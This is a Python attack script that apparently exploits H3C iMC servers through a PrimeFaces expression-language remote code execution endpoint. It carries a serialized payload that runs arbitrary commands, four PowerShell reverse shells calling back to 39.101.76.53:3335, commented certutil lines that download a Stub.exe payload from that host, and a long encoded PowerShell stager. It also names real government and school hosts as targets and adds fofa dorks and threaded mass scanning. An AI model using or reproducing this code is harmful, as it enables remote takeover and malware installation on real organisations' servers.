import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import pymongo
import time

client = pymongo.MongoClient(host='localhost', port=27017)

db = client['test']
mycol = db['H3c_Magic']

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'
# fofa: body="loginForm:loginTypeWebOrDesktop"
# fofa: body="推荐分辨率显示宽度为1280"

def exploit(ip_, index):
    try:
        #  13.231.45.178
        powshell1='powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("39.101.76.53",3335);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        powshell2="""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('39.101.76.53',3335);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """
        powshell3="""powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('39.101.76.53', 3335);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" """
        powshell4="""powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('39.101.76.53', 3335);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" """
        # command=['certutil -urlcache -f http://39.101.76.53:8000/Stub.exe C:\\my.exe','C:\\my.exe']
        # command=['certutil -urlcache -f http://39.101.76.53:8000/Stub.exe C:\\Program Files\\iMC\\client\\bin\\my.exe','C:\\Program Files\\iMC\\client\\bin\\my.exe']
        command=['dir']
        # command=[powshell1,powshell2,powshell3,powshell4]
        url = ip_+'/imc/javax.faces.resource/dynamiccontent.properties.xhtml'
        # command=['systeminfo','ipconfig /all']
        # command=['powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADQAZwBFAEMARQBLAE0AMgBjAEkAYgB0AGYAUQBBADIAOABSADQAdwBXAEMAVwBtAEwAdwBvAEsAdABzAEYARgBIAGcAdABsAHcASAB6AHAAdgAvADcAbABBADAAawA2AGUAbgAwAFQARQBzAHoAUwBNAGgAVgA5AGwAMQBPAG4AYgB2AFUATgBTAEMANQBOAHcAaABHAE4AbABFAEQAQgB6AEwAMwBjADQAaABqAEYAUABnAE0AZAAzAHUANwBTAG4AeQBiAFoATwB0AHMAOABiAGEARwA1AEMAMwBFAGcAZgAwAEcASABBAGYARABPAEcAYgArAHYAcgAzAFIAQQBRAFkAZQBVADcAegBiAEEALwB6AG0AQgBVADcAaQB3AGcAcQBUAGIAegBKAEIANgBDAFEAWQBsAG0ANQB1AGIAbQAvAHkAVgA0AGsAZgBnAHgAVgA4ADgAdwBGAEIAZQAvAGoAbQBRAGIASQBKAG4ASgBqADUAeABoAFIAZgB1AG0ASABJAEIAeAA1AEEALwB1AHMAZgBmAC8AUQBUAGoASwBGAFAAegB2AHYAcQBBAEoASgB1AEgARQBQAFAAYwBoAEcATQBpAHkAWABtAG4AOAB4AGkAQQB6AEcAOABIADEAbABiAGEAQgBQAG0AYgArAGIAdQByAFQAcAB3AEEAdwB1ADQARgA3AEcAMABEACsAdwBOAFAAVQBYAFgAZAA3AEoAdgBTAG0AQwBEADcAQQBSAFYASQAzAFEAUgBLAFIAYgArACsAcQB0AFEAZQByAG0AdgB2AFYAYQBGAEsAQQBGAHUAWABDAHcAWQBhAFUAeQBnAFYAMwBWAGMAdAAxAEIAaQB2AHAAYwB5AGgAOQBNADAAaABNAFcAQwBpAG0AdwBjAHgATQBHAEsAVgBCAGYASQByADMAUABWAFcAWQA1AGUAeQA4AEcAcgBaACsAeQBGADAAdQBWAGsANgB4AEQAUQBjAC8AegA2AGsASgBuAFYAcwAwADYAeABRAEoAYwA2ADUAYQBaADcANQByAEIAUQBZAFYANAB5AGYAeQArAHYAcgA4AHkAZgA3ADIAZwBtAGkAVQArAFEAQgA2AHUAUwBUAHkAQQBPAFEAZwBQAGkAUABiAEoAaABYAEgAMABDAHYAdQBQAEMAQwBWAHgAUgB0AFUASgBNAFkAKwBhAHYAQwB5AFUASwBBAGsATwBTAFkASgArADUAWQBxAEYANgArADIAQQBIAGkAMwBkACsANAByAG8AVgBhAHYAZgBsAGQAKwAyACsARgBqAFYANAB1AEoATAA3AHUAMAByAEYAegAwAHAAVQBTAGkAZQA0AFYATABuAGsAeABPAC8AUQBvAGUAWgA1AGMAegBaAEgAagAvAE0AVAArAGsALwBKAFYAYQBLAC8AbgB4AEsAcwBkAFAAdgA5AHEAMQBSADEAbwBBAHYAWABnAE0AQQAzAFEAdgBuADkAbABLAHUAMwBOAHoAYwB2ACsAUgBMAFMAOAB4AFQAMQBJAEUAYQA1ADMAagBlAEcAcgBUAEEAcQBCAFEARgBJAGcATgBNAHMAbgBGAE8AYwB3AE4ATAByAFIAMwB6AE8AYgBxACsAYQBjAGUAVwBYAGgAbQBwAFgAcgBZAHYATwBPAFQAeABuAEgATgArAFkAbAAzAG0AQQBuAE4AZgBiAG0AOQBMAHQASgBYAHUAeQA5ADIAOQBXAGcAbAB3AEgANAB1AHoANwByADYAdQBCAGgAeQB2AGsAUQB6ADcAMQBnAFkAZgBzAGEAOABJAFgAdgA0AG8AWgBYAEwAawB3ADUANgBOADYARgBkAE0AbwB6AG0ATABoADgAZwBFADYALwBJAFcAZABRAGsAYgBvAHkAOAA5AHEAZwBvAGYASQB1ADIANwB2AEQASwA1AHIAMAA3AGoASABGAEIAVgBOAGkAZABLAFAAWQBNADQAeABMAEIAWQBrAFgANABVAGUANQBlACsAOABwADIAbAA2AHQANgBKAGwAQgBxAC8AUwBsADkASgBLAHIAOQA2AHoAZgBaAGIATABmAFIAZgBFAGMAWQBYAFIARQAxAHIAbgBkAG8AVQB4AEkASABDAGgAVQAyAEcANgBmAG8AdwB1AG4ANwBvAEoAQwBmAEoAbAA0AFEATwB1AG0AcgBnAEUAMgBTAEEAbQBWADMATwB2AHAAUwA4AG8AdgBiAGoAdQBCAHoANgB0AG0ATQBTAG0AMABhAFUAMABUAEkAMABRADIAZwBpADQARwBTAHMAVgA1AGcAawA1AHMASgBjAGEAYQBIADIARgBVAFAAaQBTAGsAegA1AHcAWABWAHAAeQAxAE4ASwBlAHgAbwBTACsAeQBiAGcAdwBTAEoAWQB6ADIASwBuADgAZQAzADYAVQBxAGcAWQBrAGsAaABlADYAMABLAFAAUwBlAFIAYwBTAFgAYgBDAG0AUABlAGQAUwBVAFgAbQA2AGcAVABWADAAQwB2ADgAQgA5AHIAVgBPAHoAawBXAFIAYwBYAFUAbAA2AFIATgBvAG0AZwBDAEcARwA1AEEASwBNADAAZQBZADAATAA1AFcAcQBQAHkAVQBlAFAAOABiAHYAQgA5AGIAegBBADgAdwArAHgAaABlAEEAbABuAE0AQwAxAEYAYQAwAFkAWgArADcAZwBLAFUAbgBSAGkAZABhAEQATwBHAEUAZgBOAFkAeQBrAHIAdwBwAFoAZQBTAHIASgBaAHkATQAzAFoAMgAzAFgAeAA3AEoAegBxAG4ARgBSAE8AcQBKAE8ATABBADYANABFAFkAdABoAHAARwAzAHUATwBLAGgAVABxAFgAcgBJADgAZABYAFcAbQBsADYAbABiAGkAaABxAG4AcABhADAAZgBiAG4AMgBOAGgATAB3ADUAQQBhADMATQBjAGMAMABsAGcAVAB3AG0ATwBuAGcAUwBlADcAaQBjADIARgA4AGYAdQB3AEEAMgB0AGoAUgBLAEIAbwA3AEwAZABIAGoAdgA5ADUAMQBUAFEAdQA1AHkAQwBXAHEAaQBKAHAARQBUAHAAbgBYAHcAUgAyAFIANwBWAEcANAA4AEMAYwA5AEwAQgAwAGwANABUAEEAegBkAHUAeQAzADEAeABNAFEATgBvAEcAKwBXACsARQBxADkAUgBjAHcAUwBRAEsAaQBlADcAdABjAEUAagBEAGcAYgBtAFEAWQB1AGsAdgBkADUAMQBGAG4AdQA3ADUAYwBtAEIAMgBDAEoAVQBkADUANABJAFMAWQBpAEYAWgBLAFMAYgBpAFIASQBwAG4AbwBRAGEAbQB6ADAALwBKADgATwA5AE4ASABoADgAawBqAGsAVABQAEwAcABXAEcAKwBiADYAVABwAFQANQBNAHEAUAAxAEgAbQBUADcAVQB5AGYAYgBvADYAZwBQAGMAZQBiAEgAcABPAHoARABlAHEAMABGAEYAOABPADIANgBZAGMASQBMAHAATAAxADYAYQBBAGgAMgB6AG4AeABrAEIAdgBTADkAMABtAGcAMgBtAEYAYwAxADAANwAyAGEAcgBmAGIAZwByAEEAMgBNADMAWQAxAGUAVABwAGIAUABsAE4AdQBhAGkARABDAG8AdABYAEMAaABoAG0ANgArADMAbAAzAHQAcQB2AHIAUwA1AHgAagAyADQAcwBVAG8ANQBiAGgAUgBEAFkAMwBQAEoAbgBoAGIAdQBuAE0ASQA2AEcAdQBXADkATABzAHkAYwBWAFIATQBrAFIAZQB1AG0AdABLADYAVQBYAEcARwA2AGEARwAwAGEATgBQAGUAZQBuAEkAMABXAFAAVABPAFgASABwAFUAOQBnAEEATABZAHcAbwBwADAAZgBxAHAANQAzAHgAYQA4AC8AaQByAGIAUQBZACsAZgBhAHoAaQBEAHgANwB3AC8ARwBUAHIAZAAzAHgAawBxAGgASgBjAFQAZQBlAHQASwBIADgAZgBNAFEAUgBHAGUASgBvADcAMABiAE4AawBXADUAbgB1AEgATwA5AFQASAA3AGMAYwBFAGMAMQBLAGgAOQBaAFcAMABVAEcAWgBRAG0AcABXADkAQQA1AHgAWQBvAE0AOQA5AGsANgAxAFgAbgA1AG0ARQBwAGIANgBUAEgAcABaAFgAcQA4AEkAQQBiAFQAaABiAEIAdABjAGcAMQBrAEQAZwBjAG4ANQBUAFQAZQBwADUATQBwAHMAUABnAG4AWgA2AHQAMAAvAEcAaQB3AHMARAB4ADkAMQBwAEUAZgA1AGUATgB5AG4AVQBaAEoAWgB5AGUAZABaAG8ALwBzAHAAQgBtAEoAYgBWADIAeABZAEUAdAA0AFcARAA4AC8ATwBYAEgAZABIAGsAOQByADgAbABiAHEAZABIAG8ARABiAG0AcwBsACsAaQBZAFoAbQBhAHUAVwByAFMAdwBlAGYASABVAC8AMgB4AGcAYQBOAHgATwBXAEUAOQA0AGIAQwBwAE4AZAA3AFgAawB3ADEAcABLAHAANgBNAHAAVAB0AHQAUABuAGUANgBZAG0ASABGAFIAbABMAEIAeABIAE0AMwBiADQAYgBPAHgARQBmAGIASgBaADgANQBiAGYAaQA1AFoAcgAxAFIAQQBPADcASABUAFEAMQBWAGcAYQBrADYAZQBwAE8AQgBsADMAdQBWAHEAOQBlADUAeABwAHcAbQBUAE4ATwAwAEsAbwBpAFIAUABiADcATgBiAGkAdQBYAGkAawArADUAbwBvAFQAOQBpAGwATgBqADgAYwA1AHYAeABFAE4AYgB0AGMARQA1AG0AKwBHAE4AcgBkAEkASgBFAE4AVgBXADAAOQBLAEUAZQBCAFcAQwBIAGIAQgBlAFYAMgAwAEYAdgA2AEcAMABrAFkAbABxAG0ATwArAE8ARAAwAEIANABOADkAcQBnAGkASAB1AFgAVABVADIAcgBHAG8ATwAyAHkAZAA2AEIAdABGAEcARABkADcANwBYAFkAdAA3AFMALwBtAGoAVQA0AGIAbQBDAGUAaABJADgAZgBzADgAOQBJAHUAZwA4ADUARABPADAAbwBhAGcAbABlAGIARABkAEoASgBUAFQAOQB3AGwAbQBnAGgAcgB5ADEAcgBtAEQAZQBOAE0AYQB3AFAAZABPADIAeAA1AHcAcQB1AHMAZQBUAEwAegBtAG0AegBaAG4AdgA5AHcAOABKAC8AaQBFAC8AUwBUAE8ATgBOAC8ATwB4AEcASwA2AHMANQAzAHQAQQBnAG0AdwBOADcARwBEADEATQA1AHcAZABuAEcAaABnAFAANABtAHIASQBzAHQAcwBqAEoAdwBjAGQAUwBWAFEAMwBoADkAMABHAHQAMQBFAGEAbgBVAFoAcQBFAEoASwArAHoAQQArAGEAaAA5AEcAegBIAG8AQwBGAHMAVgA0ADIARgBMAE8ATQAwAGEAdwBSAGIAYwAxAFkAQQBiAFYAQQBRAEwAegBqAG4AdgB5AFYAdgBWAEYAUABWAHAAMgBRAHgAMwBKAFgAUABkAEEAQgBhAFQAagBwAFQATABpAGsAMwA2AHcAMQA0AFEAVABZAHoAVQBlAFAAYgBXAHIAQgAxAGcAegByAFUAegBjAFEAYQArAGUAYwBqAHAAWQAwAFYAMgBtAE4AeQBwAFoAMAB5AG0AcABWAEIAbQBaAGUAcwAvAEkAUwBOAHAAegBEAGsAWgB3ADQAMABPADQAZAA3AEUARQBTAEgAZQBtAGYAcABUAGwAWgBYAGwARABaAFEAeQBZAFQAUgBSAHoATgBhADkAVgBhAFIAQQBlAGEAMQA2AEQARgArADkAMgBXAHQAWgAwADMANQAyAEwAVQBuADIAQQBwADYAZABPADYAdAAxAGgAWQBKADIAMgBRAG0AbAB1AEoAMgByAFgATAB2AEwATABYADIAbgBhADkAMQB3AFgAOABSAEoAbwBLAGEAMwBZAG0AagB0AG0ARgAwAEYAZQBYAEQANwBQAEUAeQBOAHYAawBLAHMAQgAwADgAagBsAG0AMAA4AFEALwBHAFAAcQA4AGQAdwBuAHoAMwB1AHgAbwBpADYATwB0AE4AWAB0AGYATAB1AGYAdAA4AE8AYgA5ADAAOAB2AGQAOABmAFUANgBRAHIANwB2ADcANgAwAGoATgBWAGQAdgAzAHQANQA4AHYAOAA0AEsAZQAvAEMAcABZAC8ANQBxAE0AbABNAEIAagBqAGYAQQBwAFoAMgBVAFQAbABmAFgAdQAxAEUATQBzAEgAaQBaAGsAZgBRAEEAWgBSAHIARgA0AHQAZABqAC8AUQA1AGkASAA3AHAAMAA1AEsAVgBEADgAZgBWAEcANgBiAHAAdQBZAEcAZABUADMAUwAvAEcAcQB6AC8AZgBlAHoANgA5AE8AVwBkADAAVwBlAGUAKwBYAEoAVQArAEwAbwBkAFMANgBYAHIAdABXAGMAbABxAGwAWQA4ACsAbAB5AE4AZQBKADgAQwBQAGEAMgBSAEoAegAxAGYANQBSAEsAUQBDAC8AVABYAFoAVgBCAGoAMgBXAEcAZABaAE4AbgBzADIAVwBHAHIAdAA5ADQAbgBwAEIAMgBGAGEAZgBMAGQAWAB5AFcAYQAvAFQAMQBBACsAdQAzAEoAegBWACsALwBEAEcAawA1ADgARAAvADQAZgBZAC8AQwBEADEALwAvAE8AYgBzAFoAZgBQAGoAOQArAHMASgBjAGoAKwBwAHEAeQA3AEUATAArAEYANQAzAGwAeABUAGoAZgBEAFEAQQBBACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA']
        dic={}
        dic['url']=ip_
        print(index,ip_)

        for c in command:
            print(c)
            burp0_data = {"pfdrt": "sc", "ln": "primefaces", "pfdrid": "uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV/KAe9gtw54DSQCl72JjEAsHTRvxAuJC+/IFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf/cNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv+Eo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c+GvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy+ZLezLj6vK+pVFyKR7s8xN5Ol1tz/G0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM/cwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16/I7eog15OBl4Kco/VjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH+N7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO+Eb/60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF/ciVuZGssKeVT/gR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx/qFUj+DikXHLvbUMrMlNAqSFJpqoy/QywVdBmlVdx+vJelZEK+BwNF9J4p/1fQ8wJZL2LB9SnqxAKr5kdCs0H/vouGHAXJZ+Jzx5gcCw5h6/p3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D/ukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd+LylDFB3dcYIgZtZoaSMAV3pyNoOzHy+1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3+9h0aurkyJVR28jIQlF4nT0nZqpixP/nc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl+zoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH+OwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE+lsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU=", "cmd": c}
            # print(index,url)
            
            res = requests.post(url, data=burp0_data,headers=headers, timeout=15, verify=False)
            # if len(res.text)==0:
                # return
            print(res, len(res.text))
            print(res.text)
            dic[c]=res.text

            # with result_path.open('a+') as file:
                # file.write(ip_+line_break)
        # res=mycol.insert_one(dic)
        # print(dic)
    except Exception as e:
        print(e)
        pass


# url='http://186.225.110.218:8881'     #maua.sp.gov.br    Windows server2019  denfer
# url='https://203.68.26.28:8443'       #hkhs.tnc.edu.tw   ESET   2012
url='https://200.232.88.100'          #creasp.org.br     无杀软  2016   \\NIKE.creasp.org.br  2000多用户
#        172.16.0.185                                                     172.16.0.160
exploit(url,1)  


threads = []
# with open(r'D:\Downloads\tmp\h3c.txt', 'r') as file:
with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 10
        end = start+0

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'mt'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()